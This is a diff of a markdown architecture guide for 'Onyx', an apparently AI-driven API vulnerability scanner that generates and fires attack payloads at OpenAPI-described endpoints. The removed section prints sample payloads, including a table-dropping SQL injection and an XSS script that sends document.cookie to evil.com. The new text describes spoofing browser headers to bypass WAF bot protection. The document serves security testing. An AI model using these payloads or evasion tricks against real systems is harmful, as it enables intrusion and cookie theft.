@@ -1,527 +1,247 @@
-# Onyx — Deep Dive Workflow Guide
+# 🔮 Onyx — Deep Dive Workflow Guide
 
-A complete explanation of how every piece of this project works, from the moment you paste a URL to the final attack result appearing on your dashboard.
+A complete architectural breakdown of how every piece of this project works, from the moment you paste a URL to the final attack result streaming to your dashboard.
 
 ---
 
-## Table of Contents
+## 📑 Table of Contents
 
 1. [What is Onyx?](#1-what-is-onyx)
 2. [What Can I Paste? (OpenAPI / Swagger Explained)](#2-what-can-i-paste-openapi--swagger-explained)
 3. [The Full Flow (Step by Step)](#3-the-full-flow-step-by-step)
-4. [Docker — What It Is and Why We Need It](#4-docker--what-it-is-and-why-we-need-it)
-5. [Redis — The In-Memory Queue Store](#5-redis--the-in-memory-queue-store)
+4. [Security & Resilience Layers 🛡️](#4-security--resilience-layers-)
+5. [Docker — The Redis Engine](#5-docker--the-redis-engine)
 6. [BullMQ — The Job Queue System](#6-bullmq--the-job-queue-system)
-7. [Swagger Parser — Reading the API Blueprint](#7-swagger-parser--reading-the-api-blueprint)
-8. [Gemini AI — The Payload Brain](#8-gemini-ai--the-payload-brain)
-9. [Prisma & PostgreSQL — Logging Everything](#9-prisma--postgresql--logging-everything)
-10. [WebSockets — Live Streaming to the Dashboard](#10-websockets--live-streaming-to-the-dashboard)
-11. [Architecture Diagram](#11-architecture-diagram)
-12. [Startup Commands (Quick Reference)](#12-startup-commands-quick-reference)
+7. [Gemini AI — The Payload Brain](#7-gemini-ai--the-payload-brain)
+8. [Prisma & PostgreSQL — Persistent Logging](#8-prisma--postgresql--persistent-logging)
+9. [WebSockets — Live Telemetry](#9-websockets--live-telemetry)
+10. [Architecture Diagram](#10-architecture-diagram)
+11. [Startup Commands (Quick Reference)](#11-startup-commands-quick-reference)
 
 ---
 
 ## 1. What is Onyx?
 
-Onyx is an **AI-powered API vulnerability testing engine**. You give it a link to any API's documentation (called an OpenAPI/Swagger spec), and it:
+Onyx is an **AI-powered API vulnerability testing engine**. You provide a link to any API's documentation (an OpenAPI/Swagger spec), and it autonomously:
 
-1. **Reads** every endpoint the API exposes (e.g., `POST /users/login`, `GET /products/{id}`)
-2. **Generates** malicious payloads using Google's Gemini AI — things like SQL injection strings, XSS scripts, oversized data, and broken authentication tokens
-3. **Fires** those payloads at the API one by one (rate-limited so you don't get blocked)
-4. **Streams** the results live to your dashboard — showing which attacks caused errors (500s), which were blocked, and how fast the API responded
+1. **Parses** every endpoint the API exposes (e.g., `POST /users/login`, `GET /products/{id}`).
+2. **Generates** malicious schema-aware payloads using Google's Gemini AI — synthesizing SQL injection strings, XSS scripts, oversized integers, and logic bypass vectors.
+3. **Fires** those payloads at the target API using a highly concurrent, rate-limited distributed queue.
+4. **Streams** the results live to your dashboard via WebSockets, instantly alerting you to `500 Internal Server Errors` or data leaks.
 
-Think of it as a **hacker simulation** that tests how secure an API really is.
+Think of it as a relentless **hacker simulation bot-net** that stress-tests your infrastructure before deployment.
 
 ---
 
 ## 2. What Can I Paste? (OpenAPI / Swagger Explained)
 
-### What is an OpenAPI / Swagger spec?
+### The API Blueprint
 
-Every modern API has a **machine-readable documentation file** that describes all its endpoints, parameters, request bodies, and response formats. This file is written in a format called **OpenAPI** (formerly called **Swagger**).
+Every modern API has a **machine-readable documentation file** that describes all its endpoints, expected parameters, and response formats. This is written in **OpenAPI** (formerly Swagger).
 
-It's usually a `.json` or `.yaml` file hosted at a URL like:
+> [!TIP]
+> Most APIs document their spec at common endpoints like `/swagger.json`, `/openapi.json`, or `/v2/api-docs`.
 
-- `https://petstore.swagger.io/v2/swagger.json`
-- `https://api.example.com/openapi.json`
-- `https://api.example.com/docs/swagger.yaml`
+### Validation Rules
 
-### What can you paste?
+| ✅ Valid Targets                              | ❌ Invalid Targets                             |
+| :-------------------------------------------- | :--------------------------------------------- |
+| `https://petstore.swagger.io/v2/swagger.json` | `https://google.com` (HTML website)            |
+| `https://api.example.com/openapi.json`        | `http://192.168.1.5/api` (Blocked internal IP) |
+| `https://httpbin.org/spec.json`               | `https://github.com/repo` (Not a JSON spec)    |
 
-| ✅ Works                                           | ❌ Does NOT work                                    |
-| -------------------------------------------------- | --------------------------------------------------- |
-| `https://petstore.swagger.io/v2/swagger.json`      | `https://google.com` (regular website)              |
-| `https://petstore3.swagger.io/api/v3/openapi.json` | `https://example.com/api/users` (a single endpoint) |
-| `https://httpbin.org/spec.json`                    | `https://github.com/some-repo` (not an API spec)    |
-| Any URL that returns a valid OpenAPI/Swagger JSON  | Any URL that returns HTML                           |
-
-### How do you find an API's spec URL?
-
-Most APIs document their spec URL in their docs. Common patterns:
-
-- `/swagger.json`
-- `/openapi.json`
-- `/api-docs`
-- `/v2/api-docs`
-- `/docs/openapi.yaml`
-
-### Sample URLs to test with
-
-```
-https://petstore.swagger.io/v2/swagger.json
-https://petstore3.swagger.io/api/v3/openapi.json
-https://httpbin.org/spec.json
-```
+> [!IMPORTANT]
+> **SSRF Protection strictly enforced.** Onyx runs active DNS resolution checks against user-provided URLs. Any URL resolving to a `localhost`, `10.x.x.x`, `172.16.x.x`, or `192.168.x.x` address will be instantly blocked to protect the internal server architecture.
 
 ---
 
 ## 3. The Full Flow (Step by Step)
 
-Here's exactly what happens from the moment you click **"Initiate Scan"**:
+Here is the exact lifecycle of a chaotic test run from the moment you hit **"Start Testing"**:
 
-```
+```text
 YOU (Browser)                           ONYX SERVER                         EXTERNAL
 ─────────────                           ───────────                         ────────
    │                                        │                                  │
    │  1. Paste URL, click button            │                                  │
-   │──────────────────────────────────────►  │                                  │
+   │──────────────────────────────────────► │                                  │
    │        POST /api/test-runs             │                                  │
    │        { specUrl: "https://..." }      │                                  │
    │                                        │                                  │
-   │                                        │  2. Fetch the OpenAPI spec       │
+   │                                        │  2. SSRF Check & WAF Bypass      │
    │                                        │─────────────────────────────────►│
-   │                                        │     GET https://petstore/v2/...  │
+   │                                        │     Spoof Chrome User-Agent      │
+   │                                        │     GET https://target/spec.json │
    │                                        │◄─────────────────────────────────│
-   │                                        │     (returns JSON spec)          │
    │                                        │                                  │
-   │                                        │  3. Parse spec → extract endpoints
-   │                                        │     POST /pet, GET /pet/{id}...  │
+   │                                        │  3. Parse spec → Extract routes  │
+   │                                        │     (POST /pet, GET /user)       │
    │                                        │                                  │
-   │                                        │  4. For EACH endpoint:           │
-   │                                        │     → Send to Gemini AI          │
-   │                                        │     → "Generate 20 malicious     │
-   │                                        │        payloads for POST /pet"   │
-   │                                        │     → Gemini returns JSON array  │
+   │                                        │  4. AI Payload Synthesis         │
+   │                                        │     → Ask Gemini for 20 payloads │
+   │                                        │     → Fallback to static if fail │
    │                                        │                                  │
-   │                                        │  5. Queue all payloads in BullMQ │
-   │                                        │     (stored in Redis)            │
+   │                                        │  5. BullMQ Queue Dispatch        │
+   │                                        │     → Store 100+ jobs in Redis   │
    │                                        │                                  │
    │  6. WebSocket subscription             │                                  │
    │◄─────────────────────────────────────  │                                  │
    │     "SUBSCRIBE to test run XYZ"        │                                  │
    │                                        │                                  │
-   │                                        │  7. Worker picks jobs from queue │
-   │                                        │     → Fires payload at target API│
+   │                                        │  7. Worker picks job from queue  │
+   │                                        │     (Rate limited to max 5/sec)  │
    │                                        │─────────────────────────────────►│
-   │                                        │     POST /pet with SQLi payload  │
+   │                                        │     POST /pet (SQLi Payload)     │
    │                                        │◄─────────────────────────────────│
-   │                                        │     Response: 500 / 200 / 403    │
+   │                                        │     Response: 500 Server Error   │
    │                                        │                                  │
-   │  8. Live result streamed via WS        │                                  │
+   │  8. Live telemetry streamed via WS     │                                  │
    │◄─────────────────────────────────────  │                                  │
-   │     { statusCode: 500, method: "POST", │                                  │
-   │       endpoint: "/pet", payload: "...",│                                  │
-   │       responseTime: 142 }              │                                  │
+   │     { statusCode: 500, type: "SQLI",   │                                  │
+   │       endpoint: "/pet", latency: 142 } │                                  │
    │                                        │                                  │
-   │  9. Dashboard updates in real-time     │                                  │
-   │     (table row appears, counters       │                                  │
-   │      update, status changes)           │                                  │
+   │  9. Dashboard visually updates         │                                  │
+   │     (Metric counters tick up)          │                                  │
 ```
 
 ---
 
-## 4. Docker — What It Is and Why We Need It
+## 4. Security & Resilience Layers 🛡️
 
-### What is Docker?
+Onyx operates in hostile environments. It is built with several defensive and offensive mechanisms:
 
-Docker is a tool that runs **lightweight virtual machines** (called _containers_) on your computer. Think of it like this:
+1. **WAF Bypass Engine**: Many APIs sit behind Cloudflare or AWS WAFs that block automated bots fetching their `swagger.json`. Onyx uses intelligent header spoofing (mimicking modern Chrome macOS setups) to slip past bot-protection during the parsing phase.
+2. **DNS-Resolving SSRF Guard**: A malicious user could submit `http://169.254.169.254` (AWS Metadata) or `http://localhost:6379` to attack the server itself. Onyx resolves the DNS of every target URL and aborts the pipeline if the IP targets private ranges.
+3. **Strict Rate Limiting**: The attack creation endpoints are limited to 5 test runs per hour per IP to prevent Gemini API credit drain.
+4. **Mandatory JWT Secrets**: The application refuses to boot if `JWT_SECRET` is missing in the environment, actively preventing deployment with default/weak cryptographic keys.
 
-> Instead of installing Redis on your Mac directly (which requires configuration, might conflict with other software, and is annoying to uninstall), Docker downloads a tiny pre-built "box" that already has Redis perfectly configured inside it.
+---
 
-### Why do we need Docker for Onyx?
+## 5. Docker — The Redis Engine
 
-Onyx needs **Redis** (an in-memory database). Instead of making you install Redis natively on your Mac, we use Docker to run it:
+We rely on **Redis** for blazingly fast in-memory queue management. Instead of native installations, we use an Alpine Docker container:
 
 ```bash
 docker compose up redis -d
 ```
 
-This one command:
+This isolates the 30MB Redis environment, preventing port routing conflicts and keeping local development pristine.
 
-1. Downloads the `redis:7-alpine` image (a tiny Linux + Redis bundle, ~30MB)
-2. Creates a container named `onyx-redis`
-3. Starts Redis on port `6379`
-4. Runs it in the background (`-d` = detached)
-
-### Docker commands you'll use
-
-| Command                      | What it does           |
-| ---------------------------- | ---------------------- |
-| `docker compose up redis -d` | Start Redis container  |
-| `docker compose down`        | Stop everything        |
-| `docker ps`                  | See running containers |
-| `docker compose logs redis`  | See Redis logs         |
-
-### Why NOT Docker for PostgreSQL?
-
-We use **Neon** (a cloud PostgreSQL service) instead of a local Docker container because:
-
-- It's always available (no need to start Docker)
-- Your data persists even if Docker is restarted
-- It's a real production-like database
-
----
-
-## 5. Redis — The In-Memory Queue Store
-
-### What is Redis?
-
-Redis is an **in-memory data store** — think of it as a super-fast database that keeps everything in RAM instead of on disk. It's used by companies like Twitter, GitHub, and Snapchat for things that need to be blazing fast.
-
-### Why does Onyx need Redis?
-
-Redis is the **backbone of our job queue**. When Onyx generates 200 attack payloads, it doesn't fire them all at once (that would overwhelm the target API and get you rate-limited). Instead:
-
-1. All 200 payloads are **stored as jobs in Redis**
-2. The worker picks them up **one at a time**, with a small delay between each
-3. If the server crashes, **the jobs survive** in Redis and can be retried
-
-### Redis in Onyx's architecture
-
-```
-Gemini AI generates payloads
-         │
-         ▼
-   ┌─────────────┐
-   │    Redis     │   ← Jobs stored here as a queue
-   │  (port 6379) │   ← "Attack POST /pet with SQLi payload"
-   └──────┬──────┘   ← "Attack GET /user with XSS payload"
-          │
-          ▼
-   ┌─────────────┐
-   │   Worker     │   ← Picks up one job at a time
-   │  (BullMQ)    │   ← Fires it at the target API
-   └─────────────┘   ← Streams result via WebSocket
-```
+_(Note: We do not containerize PostgreSQL. We rely on Neon Serverless Postgres for production-parity remote data persistence)._
 
 ---
 
 ## 6. BullMQ — The Job Queue System
 
-### What is BullMQ?
+If Onyx generates 500 attack payloads, looping through them synchronously would stall the V8 engine and trigger rate-limits on the target API.
 
-BullMQ is a **Node.js job queue library** built on top of Redis. It manages the "to-do list" of attack payloads.
+Enter **BullMQ**:
 
-### Why not just use a for-loop?
+- **Concurrency Caps**: Limits how many workers process attacks simultaneously.
+- **Fault Tolerance**: If the Node server crashes mid-attack, the jobs survive in Redis and resume upon restart.
+- **Granular Retries**: Network timeouts (like `ECONNRESET`) can trigger automatic job retries before marking an attack as failed.
 
-You might think: _"Why not just loop through the payloads and fire them?"_ Here's why a queue is better:
+---
 
-| Problem                                                                      | How BullMQ solves it                             |
-| ---------------------------------------------------------------------------- | ------------------------------------------------ |
-| **Rate limiting** — APIs block you if you send too many requests too fast    | BullMQ adds configurable delays between jobs     |
-| **Server crashes** — If your server crashes mid-attack, all progress is lost | Jobs are persisted in Redis and auto-retried     |
-| **Concurrency** — Some attacks need to run sequentially, others in parallel  | BullMQ controls how many jobs run simultaneously |
-| **Monitoring** — You need to know which payloads succeeded vs failed         | BullMQ tracks job status, retries, and errors    |
+## 7. Gemini AI — The Payload Brain
 
-### How BullMQ works in Onyx
+Google's **Gemini 2.5 Flash** replaces static wordlists with dynamic, schema-aware intelligence.
 
+**The Prompt**: It is instructed to act as a 15-year Senior Penetration Tester.
+**The Output**: It generates exactly 20 JSON payloads covering SQLi, NoSQLi, XSS, Broken Auth, Boundary Overflows, and Path Traversals — meticulously formatted to match the exact data types requested by the endpoint's schema.
+
+> [!NOTE]
+> **Graceful Degradation**: If the Gemini API is unreachable or rate-limited, Onyx instantly catches the exception and falls back to a locally hardcoded array of 35 heuristically-proven payloads, guaranteeing the attack pipeline never stalls.
+
+---
+
+## 8. Prisma & PostgreSQL — Persistent Logging
+
+Every single attack executed by a worker is persisted via **Prisma ORM** into a remote **Neon PostgreSQL** database.
+
+```text
+TestRun 1 ───► M TargetEndpoints 1 ───► M AttackLogs
 ```
-Producer (test-run.controller.ts)
-  → Adds jobs to the "chaos-attacks" queue
-  → Each job = { method, path, payload, attackType }
 
-Redis
-  → Stores all pending jobs
+This strict relational logging allows you to exit the dashboard midway through an attack and pull up the full historical report days later on the `/history` route.
 
-Worker (worker.ts)
-  → Picks up jobs one at a time
-  → Fires HTTP request to the target API
-  → Records status code, latency, response
-  → Sends result to WebSocket manager
-  → Logs result to PostgreSQL
+---
+
+## 9. WebSockets — Live Telemetry
+
+HTTP polling is too slow and resource-heavy for real-time attack monitoring. Onyx establishes a full-duplex persistent `ws://` connection upon loading the Dashboard.
+
+As BullMQ workers complete an HTTP attack, they push the `{ statusCode, latency, payload }` directly to the `WsManager` singleton class, which instantly broadcasts it to the authenticated client's active room. React state updates locally, creating a live, streaming terminal experience.
+
+---
+
+## 10. Architecture Diagram
+
+```mermaid
+graph TD
+    classDef client fill:#0c0c0c,stroke:#333,stroke-width:1px,color:#fff
+    classDef server fill:#141414,stroke:#22d3ee,stroke-width:1px,color:#fff
+    classDef external fill:#1a1a1a,stroke:#ff5f57,stroke-width:1px,color:#fff
+    classDef db fill:#1a1a1a,stroke:#339933,stroke-width:1px,color:#fff
+
+    subgraph Client [React Frontend]
+        UI[Landing / Dashboard]:::client
+        WS_Client[WebSocket Client\nReal-time Stream]:::client
+        UI -.-> WS_Client
+    end
+
+    subgraph Server [Node.js / Express Backend]
+        API[REST API\n/api/*]:::server
+        WS[WebSocket Manager]:::server
+        Parser[OpenAPI Parser\nWAF Bypass]:::server
+        SSRF[SSRF Guard\nDNS Resolver]:::server
+        Gemini[Gemini 2.5 Flash\nPayload Gen]:::server
+        Queue[BullMQ Producer]:::server
+        Worker[BullMQ Worker\nHTTP Attacker]:::server
+
+        API --> SSRF
+        SSRF --> Parser
+        Parser --> Gemini
+        Gemini --> Queue
+        Worker --> WS
+    end
+
+    subgraph Storage [In-Memory & Persistent Storage]
+        Redis[(Redis\nJob Queue)]:::db
+        Neon[(Neon PostgresDB\nPrisma ORM)]:::db
+    end
+
+    subgraph External [Targets & Providers]
+        TargetAPI((Target API)):::external
+    end
+
+    %% Flow connections
+    UI -->|1. Submit Spec URL | API
+    Queue -->|Push Jobs| Redis
+    Redis -->|Consume Jobs| Worker
+    Worker -->|Fire Payloads| TargetAPI
+    Worker -->|Log Result| Neon
+    WS -->|Push Result| WS_Client
 ```
 
 ---
 
-## 7. Swagger Parser — Reading the API Blueprint
-
-### What does the parser do?
-
-When you paste a URL like `https://petstore.swagger.io/v2/swagger.json`, the parser:
-
-1. **Fetches** the JSON file from that URL
-2. **Validates** that it's a proper OpenAPI spec (not garbage HTML or a 404 page)
-3. **Extracts** every endpoint:
-    - Method: `GET`, `POST`, `PUT`, `DELETE`
-    - Path: `/pet`, `/user/{username}`, `/store/order`
-    - Parameters: query params, path params, headers
-    - Request body schema: what JSON the endpoint expects
-
-### Example: What the parser extracts from Petstore
-
-```json
-[
-    {
-        "method": "POST",
-        "path": "/pet",
-        "operationId": "addPet",
-        "parameters": [],
-        "requestBodySchema": {
-            "type": "object",
-            "properties": {
-                "id": { "type": "integer" },
-                "name": { "type": "string" },
-                "status": {
-                    "type": "string",
-                    "enum": ["available", "pending", "sold"]
-                }
-            }
-        }
-    },
-    {
-        "method": "GET",
-        "path": "/pet/{petId}",
-        "operationId": "getPetById",
-        "parameters": [
-            {
-                "name": "petId",
-                "in": "path",
-                "required": true,
-                "schema": { "type": "integer" }
-            }
-        ]
-    }
-]
-```
-
-This structured data is then passed to Gemini AI so it can generate **schema-aware** payloads.
-
----
-
-## 8. Gemini AI — The Payload Brain
-
-### What does Gemini do?
-
-Google's **Gemini 2.5 Flash** is the AI model that generates the malicious payloads. Instead of using a static list of generic attack strings, Gemini creates payloads that are **specifically tailored to each endpoint's schema**.
-
-### The System Prompt
-
-Gemini is instructed to act as a **Senior Penetration Tester with 15+ years of experience**. It's told to:
-
-- Analyze the endpoint's method, path, parameters, and request body schema
-- Generate exactly **20 sophisticated payloads** per endpoint
-- Cover 10 attack categories: SQLi, NoSQLi, XSS, Broken Auth, Integer Overflow, Path Traversal, SSRF, Type Confusion, Oversized Payloads, Rate Limit Abuse
-- Return **strict JSON** — no markdown, no explanations
-
-### Example: What Gemini generates for `POST /pet`
-
-Given the pet schema with `{ id: integer, name: string, status: string }`, Gemini might return:
-
-```json
-[
-    {
-        "payload": {
-            "id": "' OR 1=1; DROP TABLE pets; --",
-            "name": "test",
-            "status": "available"
-        },
-        "attackType": "SQL_INJECTION",
-        "description": "SQLi in integer field — tests if id is concatenated into raw SQL"
-    },
-    {
-        "payload": {
-            "id": 1,
-            "name": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
-            "status": "available"
-        },
-        "attackType": "XSS",
-        "description": "Stored XSS in name field — tests if output is rendered unescaped"
-    },
-    {
-        "payload": {
-            "id": 99999999999999999999,
-            "name": "a",
-            "status": "available"
-        },
-        "attackType": "BOUNDARY",
-        "description": "Integer overflow beyond MAX_SAFE_INTEGER — tests bigint handling"
-    }
-]
-```
-
-Notice how the payloads **match the schema structure** — they use `id`, `name`, and `status` fields with the right types but malicious values. This is much more effective than generic attack strings.
-
-### What if Gemini fails?
-
-If the API key is missing, the request times out, or Gemini returns invalid JSON, the system **gracefully falls back** to 35 built-in static payloads covering all attack categories. The attack sequence never crashes.
-
-### Where is the API key?
-
-```
-server/.env → GEMINI_API_KEY=AIzaSy...
-```
-
----
-
-## 9. Prisma & PostgreSQL — Logging Everything
-
-### What is Prisma?
-
-Prisma is an **ORM** (Object-Relational Mapping) — it lets you interact with the PostgreSQL database using TypeScript instead of writing raw SQL queries.
-
-### What is PostgreSQL (Neon)?
-
-PostgreSQL is the relational database where all test run data is permanently stored. We use **Neon** — a serverless PostgreSQL service in the cloud — so you don't need to run a local database.
-
-### What gets stored?
-
-```
-┌──────────────┐     ┌──────────────────┐     ┌──────────────┐
-│   TestRun    │────►│ TargetEndpoint   │────►│  AttackLog   │
-│              │     │                  │     │              │
-│ id           │     │ id               │     │ id           │
-│ specUrl      │     │ method (POST)    │     │ method       │
-│ status       │     │ path (/pet)      │     │ path         │
-│ totalAttacks │     │ requestBody      │     │ payload      │
-│ completedAt  │     │ schema           │     │ statusCode   │
-└──────────────┘     └──────────────────┘     │ latencyMs    │
-                                              │ attackType   │
-                                              │ response     │
-                                              └──────────────┘
-```
-
-Every attack result is logged with the exact payload sent, the HTTP status code returned, and the response time — so you can review everything after the scan completes.
-
----
-
-## 10. WebSockets — Live Streaming to the Dashboard
-
-### What are WebSockets?
-
-Normal HTTP is **request → response** — the browser asks, the server answers, connection closes. WebSockets are a **persistent bi-directional connection** — the server can push data to the browser at any time without being asked.
-
-### Why does Onyx need WebSockets?
-
-Because attack results come in **one at a time** over several minutes. Without WebSockets, the dashboard would have to keep polling the server ("Any new results? Any new results? Any new results?"). With WebSockets, the server instantly pushes each result to the dashboard as it happens.
-
-### How it works in Onyx
-
-```
-Dashboard (React)                     Server (Express + ws)
-     │                                     │
-     │  1. WS connection opens             │
-     │────────────────────────────────────► │
-     │                                     │
-     │  2. Subscribe to test run           │
-     │  { type: "SUBSCRIBE",              │
-     │    testRunId: "abc-123" }           │
-     │────────────────────────────────────► │
-     │                                     │
-     │                     Worker finishes attack #1
-     │                                     │
-     │  3. Server pushes result            │
-     │◄──────────────────────────────────── │
-     │  { type: "ATTACK_RESULT",          │
-     │    data: { statusCode: 500, ... } } │
-     │                                     │
-     │  Dashboard adds row to table        │
-     │  Counters update (Total: 1)         │
-     │                                     │
-     │                     Worker finishes attack #2
-     │                                     │
-     │  4. Another result pushed           │
-     │◄──────────────────────────────────── │
-     │  { statusCode: 200, ... }           │
-     │                                     │
-     │  ... continues for every attack ... │
-```
-
----
-
-## 11. Architecture Diagram
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                        YOUR BROWSER                             │
-│                                                                 │
-│  ┌─────────────┐    ┌──────────────────────────────────────┐   │
-│  │ Landing Page │───►│           Dashboard                  │   │
-│  │  (paste URL) │    │  • Metric cards (requests, failures) │   │
-│  └─────────────┘    │  • Live event stream table           │   │
-│                      │  • WebSocket connection indicator    │   │
-│                      └────────────┬─────────────────────────┘   │
-│                                   │                             │
-│                          HTTP + WebSocket                       │
-└───────────────────────────────────┼─────────────────────────────┘
-                                    │
-                          Vite Proxy (dev mode)
-                           /api → :3001
-                           /ws  → :3001
-                                    │
-┌───────────────────────────────────┼─────────────────────────────┐
-│                          ONYX SERVER (:3001)                    │
-│                                                                 │
-│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐   │
-│  │ Express  │  │ Swagger  │  │ Gemini   │  │  WebSocket   │   │
-│  │ Routes   │──│ Parser   │──│ AI 2.5   │  │  Manager     │   │
-│  │ /api/*   │  │          │  │ Flash    │  │  (ws)        │   │
-│  └────┬─────┘  └──────────┘  └────┬─────┘  └──────┬───────┘   │
-│       │                           │                │            │
-│       │              ┌────────────▼─────────┐      │            │
-│       │              │  BullMQ Producer     │      │            │
-│       │              │  (queues payloads)   │      │            │
-│       │              └────────────┬─────────┘      │            │
-│       │                           │                │            │
-│  ┌────▼───────────────────────────▼────────────────▼────────┐  │
-│  │                       Redis (:6379)                       │  │
-│  │                    (Docker container)                      │  │
-│  └────────────────────────────┬──────────────────────────────┘  │
-│                               │                                 │
-│              ┌────────────────▼─────────────┐                   │
-│              │     BullMQ Worker            │                   │
-│              │  • Picks job from queue      │                   │
-│              │  • Fires HTTP at target API  │──────► Target API │
-│              │  • Logs result to Postgres   │                   │
-│              │  • Pushes result via WS      │                   │
-│              └──────────────────────────────┘                   │
-│                               │                                 │
-│              ┌────────────────▼─────────────┐                   │
-│              │    PostgreSQL (Neon Cloud)    │                   │
-│              │  • test_runs                 │                   │
-│              │  • target_endpoints          │                   │
-│              │  • attack_logs               │                   │
-│              └──────────────────────────────┘                   │
-└─────────────────────────────────────────────────────────────────┘
-```
-
----
-
-## 12. Startup Commands (Quick Reference)
+## 11. Startup Commands (Quick Reference)
 
 ```bash
-# Terminal 1 — Start Redis (only needs Docker)
-cd /Users/raghular/Desktop/ChaosForge
+# Terminal 1 — Start the Redis Queue Engine
+cd Onyx
 docker compose up redis -d
 
-# Terminal 2 — Start the backend
+# Terminal 2 — Init Backend
 cd server
-npx prisma db push    # Only needed once, or when schema changes
+npx prisma db push   # Sync Neon DB schema
 npm run dev
 
-# Terminal 3 — Start the frontend
+# Terminal 3 — Init Frontend
 cd client
 npm run dev
-
-# Open in browser
-# → http://localhost:8080
 ```
 
-### Test with this URL:
-
-```
-https://petstore.swagger.io/v2/swagger.json
-```
-
----
-
-> **TL;DR:** You paste an API spec link → Onyx reads every endpoint → Gemini AI crafts 20 smart attack payloads per endpoint → BullMQ queues them in Redis → Worker fires them one by one → Results stream live to your dashboard via WebSocket → Everything is logged in PostgreSQL.
+> [!CAUTION]
+> **Environment Must-Haves**: Your `server/.env` **must** contain a `JWT_SECRET` string, or the Express server will intentionally crash on boot to prevent insecure deployments.
